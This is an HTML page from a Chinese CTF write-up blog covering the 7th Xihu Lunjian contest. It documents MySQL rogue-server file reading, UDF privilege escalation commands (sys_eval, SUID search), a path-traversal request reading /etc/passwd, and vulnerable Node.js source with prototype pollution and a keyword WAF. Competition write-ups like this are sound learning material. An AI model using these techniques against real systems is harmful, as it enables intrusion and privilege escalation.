@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-DT27XM4C8J"></script>
+    <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-DT27XM4C8J');
+    </script>
+    
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>
+        unknown&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+
+<body id="bodyx">
+    
+
+    
+<div class="hd posts">
+
+    <a href="/index.html">
+        <i class="fa fa-reply replay-btn" aria-hidden="true"></i>
+    </a>
+    <div class="post-title">
+        <p>
+            西湖论剑-7th
+        </p>
+        <hr>
+    </div>
+    <div class="post-content">
+        
+        <div id="table-of-content">
+            <ul id="table-of-content-ul">
+
+            </ul>
+        </div>
+
+        <h1 id="only-sql"><a href="#only-sql" class="headerlink" title="only_sql"></a>only_sql</h1><p>考点：</p>
+<p>mysql服务端读取客户端文件</p>
+<p>mysql udf提权</p>
+<p>刚好，都是会的，基本操作。</p>
+<p>mysql服务端读取客户端文件</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Rain99-/p/13334755.html">https://www.cnblogs.com/Rain99-/p/13334755.html</a></p>
+<p>工具：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/rmb122/rogue_mysql_server/releases/tag/v1.0.1">https://github.com/rmb122/rogue_mysql_server/releases/tag/v1.0.1</a></p>
+<p>读query.php源码，得到靶机mysql服务的账号密码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// mine</span><br><span class="line">// $db_host = &#x27;127.0.0.1&#x27;;</span><br><span class="line">// $db_username = &#x27;root&#x27;;</span><br><span class="line">// $db_password = &#x27;1q2w3e4r5t!@#&#x27;;</span><br><span class="line">// $db_name = &#x27;mysql&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>连接靶机的mysql，执行命令。</p>
+<p><code>show databases;</code>有一个secret数据库，查出这个数据库的flag字段：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag</span><br><span class="line"></span><br><span class="line">DASCTF&#123;3386201718692</span><br><span class="line"></span><br><span class="line">Try to become ROOT</span><br></pre></td></tr></table></figure>
+
+<p>接下来是udf提权。</p>
+<p><code>show variables like &#39;%priv%&#39;</code></p>
+<p><code>show variables like &#39;%plugin%&#39;</code></p>
+<p><code>select 0x... into dumpfile &quot;/usr/lib/mysql/p1ugin/udf.so&quot;</code></p>
+<p><code>create function sys_eval returns string soname &#39;udf.so&#39;;</code></p>
+<p><code>select sys_eval(&quot;whoami&quot;);</code></p>
+<p>mysql用户。然后以为要suid提权</p>
+<p><code>find / -perm -u=s -type f 2&gt;/dev/null</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/sbin/exim4</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/su</span><br></pre></td></tr></table></figure>
+
+<p>flag在环境变量里</p>
+<p><img src="/images/loading.png" data-original="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/gcsis-7th/image-20240130215131065.png" alt="image-20240130215131065.png"></p>
+<h1 id="Easyejs-unsolved"><a href="#Easyejs-unsolved" class="headerlink" title="Easyejs - unsolved"></a>Easyejs - unsolved</h1><p>考点：</p>
+<p>putil_merge，原型链污染 <a target="_blank" rel="noopener" href="https://security.snyk.io/vuln/SNYK-JS-PUTILMERGE-2391487">https://security.snyk.io/vuln/SNYK-JS-PUTILMERGE-2391487</a></p>
+<p>ejs结合原型链污染rce</p>
+<p>写这题时候我感觉做的比较好的一个点就是去猜测后端功能是怎么实现的。</p>
+<p>上传文件接口<code>/upload</code>，上传文件返回文件uuid。</p>
+<p>读取文件接口<code>/file</code>，根据uuid读文件</p>
+<p>重命名文件接口<code>/rename</code>，提交数据：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;oldFileName&quot;:&quot;&quot;,</span><br><span class="line">    &quot;newFileName&quot;:&quot;&quot;,</span><br><span class="line">    &quot;uuid&quot;:&quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>查看所有文件<code>/list</code>，返回结果是uuid-&gt;filename的dict。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;fe3ce007-ba3d-4682-a875-3092eefa910c&quot;:&quot;3&quot;,</span><br><span class="line">    &quot;2c362f3f-285d-4354-8c52-b3d69cc0d489&quot;:&quot;1.txt&quot;,</span><br><span class="line">    &quot;f776a54d-dab7-4979-baaf-cab47cfd354c&quot;:&quot;1.txt&quot;,</span><br><span class="line">    &quot;c6e725cf-40cd-4c8f-b94e-2924d735ef5b&quot;:&quot;1.txt&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>发送以下数据给<code>/rename</code>。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;oldFileName&quot;:&quot;1.txt&quot;,</span><br><span class="line">    &quot;newFileName&quot;:&quot;../1.txt&quot;,</span><br><span class="line">    &quot;uuid&quot;:&quot;2c362f3f-285d-4354-8c52-b3d69cc0d489&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>返回重命名失败。访问<code>/file</code>，uuid带上面这个，提示文件不存在。但是<code>/list</code>显示的结果有这一条：<code>&quot;2c362f3f-285d-4354-8c52-b3d69cc0d489&quot; : &quot;../1.txt&quot;</code>。</p>
+<p>多次测试<code>/rename</code>，得出：uuid和oldFileName要对应，且oldFileName要在原来的dict存在，重命名才能成功。</p>
+<p>测一下这个：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;oldFileName&quot;:&quot;1.txt&quot;,</span><br><span class="line">    &quot;newFileName&quot;:&quot;/etc/passwd&quot;,</span><br><span class="line">    &quot;uuid&quot;:&quot;2c362f3f-285d-4354-8c52-b3d69cc0d489&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后去读，提示文件不存在。</p>
+<p>到这里我停下来思考，<code>/list</code>的dict估计是一整个存在内存里的，要取文件时候uuid做key取出文件名。既然如此，重命名接口返回的重命名失败估计没有影响，只要dict里存在即可。存在同名文件，说明有别的手段防止文件名冲突。这里我猜的是文件uuid作为文件目录，原文件就放在这个目录下。读取文件时把uuid拼到前面即可。所以要读<code>/etc/passwd</code>得穿越一下<code>../../../../../../../../../etc/passwd</code>。我猜对了。</p>
+<p>后面就是读cmdline获得源码位置，读源码，读package.json得到依赖版本。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;dependencies&quot;: &#123;</span><br><span class="line">    &quot;cookie-parser&quot;: &quot;^1.4.6&quot;,</span><br><span class="line">    &quot;ejs&quot;: &quot;^3.1.5&quot;,</span><br><span class="line">    &quot;express&quot;: &quot;^4.18.2&quot;,</span><br><span class="line">    &quot;express-fileupload&quot;: &quot;^1.4.3&quot;,</span><br><span class="line">    &quot;jsonwebtoken&quot;: &quot;^9.0.2&quot;,</span><br><span class="line">    &quot;lodash&quot;: &quot;^4.17.4&quot;,</span><br><span class="line">    &quot;multer&quot;: &quot;^1.4.5-lts.1&quot;,</span><br><span class="line">    &quot;putil-merge&quot;: &quot;^3.6.0&quot;,</span><br><span class="line">    &quot;rpc&quot;: &quot;^3.3.3&quot;,</span><br><span class="line">    &quot;sqlite3&quot;: &quot;^5.1.7-rc.0&quot;,</span><br><span class="line">    &quot;uuid&quot;: &quot;^9.0.1&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>接下来大致浏览一下源码，看见<code>putil-merge</code>里的<code>merge</code>和res.render，再结合题目的ejs，思路直接锁定ejs结合原型链污染rce。</p>
+<p>但是我想着能不能走捷径，把ejs模板文件覆盖掉，直接rce。</p>
+<p>有可能覆盖的地方有两处：</p>
+<p>上传时候的文件名。这里看似没有检查，实际上使用的文件上传组件自动消除路径穿越了。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app.post(&#x27;/upload&#x27;, (req, res) =&gt; &#123;</span><br><span class="line">    const file = req.files.file;</span><br><span class="line">    const uniqueFileName = uuidv4();</span><br><span class="line">    const destinationPath = path.join(__dirname, &#x27;uploads&#x27;, file.name);</span><br><span class="line">    // 将文件写入 uploads 目录</span><br><span class="line">    fs.writeFileSync(destinationPath, file.data);</span><br><span class="line">    global.fileDictionary[uniqueFileName] = file.name;</span><br><span class="line">    res.send(uniqueFileName);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>以及rename，这里检查<code>..</code>。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app.post(&#x27;/rename&#x27;, (req, res) =&gt; &#123;</span><br><span class="line">    if (req.body.oldFileName &amp;&amp; req.body.newFileName &amp;&amp; req.body.uuid)&#123;</span><br><span class="line">        oldFileName = req.body.oldFileName</span><br><span class="line">        newFileName = req.body.newFileName</span><br><span class="line">        uuid = req.body.uuid</span><br><span class="line">        if (waf(oldFileName)  &amp;&amp; waf(newFileName) &amp;&amp;  waf(uuid))&#123;</span><br><span class="line">            uniqueFileName = findKeyByValue(global.fileDictionary,oldFileName)</span><br><span class="line">            console.log(typeof uuid);</span><br><span class="line">            if (uniqueFileName == uuid)&#123;</span><br><span class="line">                putil_merge(global.fileDictionary,&#123;[uuid]:newFileName&#125;,&#123;deep:true&#125;)</span><br><span class="line">                if(newFileName.includes(&#x27;..&#x27;))&#123;</span><br><span class="line">                    res.send(&#x27;文件重命名失败！！！&#x27;);</span><br><span class="line">                &#125;else&#123;</span><br><span class="line">                    fs.rename(__dirname+&quot;/uploads/&quot;+oldFileName, __dirname+&quot;/uploads/&quot;+newFileName, (err) =&gt; &#123;</span><br><span class="line">                        if (err) &#123;</span><br><span class="line">                            res.send(&#x27;文件重命名失败！&#x27;);</span><br><span class="line">                        &#125; else &#123;</span><br><span class="line">                            res.send(&#x27;文件重命名成功！&#x27;);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                res.send(&#x27;文件重命名失败！&#x27;);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            res.send(&#x27;哒咩哒咩！&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        res.send(&#x27;文件重命名失败！&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>所以我就一直硬在想如何覆盖ejs。后来lolita说newFileName可以传数组，我才恍然大悟。测试后发现不行，估计是views没有写权限。</p>
+<p>直到比赛结束了我才想起来，最开始的那条路。我真是sb。而且他还有一个waf，也告诉我要用原型链。只能说不熟悉ejs rce导致的。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function waf(data) &#123;</span><br><span class="line">            data = JSON.stringify(data)</span><br><span class="line">            if (data.includes(&#x27;outputFunctionName&#x27;) || data.includes(&#x27;escape&#x27;) || data.includes(&#x27;delimiter&#x27;) || data.includes(&#x27;localsName&#x27;)) &#123;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>后来搭建docker环境复现，顺便学了一下远程docker debug nodejs，把ejs落下的功课补上。原型链复现完成后复现覆盖ejs，如果有写权限的话，newFileName传数组则可以覆盖index.ejs。</p>
+<h1 id="ezerp-unsolved"><a href="#ezerp-unsolved" class="headerlink" title="ezerp - unsolved"></a>ezerp - unsolved</h1><p>题目环境V3.3，网上搜的洞貌似没3.3，去github仓库看到issue有V3.3的sql注入和文件上传，按照poc打都不生效，便放弃了。</p>
+
+    </div>
+
+
+</div>
+<script>
+    window.onload = ()=>{
+
+        document.title = document.querySelector('.post-title p').innerText;
+
+        var zoomImgs = function() {
+            const images = document.querySelectorAll('img'); // 选择所有 img 元素
+            images.forEach(img => {
+                img.style.width = '70%'
+                img.style.height = 'auto'
+            });
+        }
+
+        zoomImgs()
+
+        var getAllHeader = ()=>{
+            var content = document.getElementsByClassName('post-content')[0].childNodes
+            // var h2 = h1.getElementsByTagName("h2")
+            var result = []
+            var pair
+            for(var node of content){   
+                var tagName = (node.tagName?node.tagName:"").toLowerCase()
+                if(tagName === 'h1'){
+                    if(pair){
+                        result.push(pair)
+                    }
+                    pair = {"h1":node,"h2":[]}
+
+                }else if(tagName === 'h2'){
+                    pair.h2.push(node)
+                }
+
+            }
+            result.push(pair)
+            return result
+        }
+
+        var writeHeader = (headers)=>{
+            var _ul = document.getElementById("table-of-content-ul")
+            for(var p of headers){ 
+                console.log(p)
+
+                var h1_li = document.createElement('li')
+                var h1_a = document.createElement('a')
+                h1_a.innerText = p.h1.innerText
+                h1_a.href = `#${p.h1.id}`
+                h1_li.appendChild(h1_a)
+                var ul = document.createElement('ul')
+                for(var h2 of p.h2){
+                    var h2_li = document.createElement('li')
+                    var h2_a = document.createElement('a')
+                    h2_a.innerText = h2.innerText
+                    h2_a.href = `#${h2.id}`
+                    h2_li.appendChild(h2_a)
+                    ul.appendChild(h2_li)
+                }
+                h1_li.appendChild(ul)
+                _ul.appendChild(h1_li)
+            }
+        }
+        var headers = getAllHeader()
+        writeHeader(headers)
+    }
+    
+</script>
+    
+    <div class="footer" id="footer">
+    <p>Copyright © 2020 <a class="flink" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>-<a class="flink" target="_blank" rel="noopener" href="https://github.com/sanjinhub/hexo-theme-geek">Geek</a>.
+    </p>
+</div>
+
+<script src="/js/js.js"></script>
+
+<style type="text/css">
+.v * {
+    color: #698fca;
+}
+
+.v .vlist .vcard .vhead .vsys {
+    color: #3a3e4a;
+}
+
+.v .vlist .vcard .vh .vmeta .vat {
+    color: #638fd5;
+}
+
+.v .vlist .vcard .vhead .vnick {
+    color: #6ba1ff;
+}
+
+.v a {
+    color: #8696b1;
+}
+
+.v .vlist .vcard .vhead .vnick:hover {
+    color: #669bfc;
+}
+</style>
+
+        <style>
+            [bg-lazy] {
+                background-image: none !important;
+                background-color: #eee !important;
+            }
+        </style>
+        <script>
+            window.imageLazyLoadSetting = {
+                isSPA: false,
+                preloadRatio: 1,
+                processImages: null,
+            };
+        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(r){r.imageLazyLoadSetting.processImages=t;var e=r.imageLazyLoadSetting.isSPA,n=r.imageLazyLoadSetting.preloadRatio||1,c=a();function a(){var t=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")),e=Array.prototype.slice.call(document.querySelectorAll("[bg-lazy]"));return t.concat(e)}function t(){e&&(c=a());for(var t,o=0;o<c.length;o++)0<=(t=(t=c[o]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(r.innerHeight*n||document.documentElement.clientHeight*n)&&function(){var t,e,n,a,i=c[o];e=function(){c=c.filter(function(t){return i!==t}),r.imageLazyLoadSetting.onImageLoaded&&r.imageLazyLoadSetting.onImageLoaded(i)},(t=i).hasAttribute("bg-lazy")?(t.removeAttribute("bg-lazy"),e&&e()):(n=new Image,a=t.getAttribute("data-original"),n.onload=function(){t.src=a,t.removeAttribute("data-original"),e&&e()},t.src!==a&&(n.src=a))}()}function i(){clearTimeout(t.tId),t.tId=setTimeout(t,500)}t(),document.addEventListener("scroll",i),r.addEventListener("resize",i),r.addEventListener("orientationchange",i)}(this);</script></body>
+
+</html>
